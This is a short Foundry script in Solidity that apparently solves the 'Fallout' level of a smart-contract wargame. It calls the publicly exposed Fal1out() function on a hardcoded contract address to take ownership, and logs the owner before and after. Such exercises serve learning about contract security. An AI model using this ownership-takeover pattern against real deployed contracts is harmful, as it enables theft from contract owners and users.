// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../src/Fallout.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract FalloutSolution is Script {
    Fallout public fallout = Fallout(0x670CF4DA7bE89969642e57350C7f3fd5C2016138);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Old contract owner: ", fallout.owner());
        fallout.Fal1out();
        console.log("New contract owner: ", fallout.owner());
        vm.stopBroadcast();
    }

}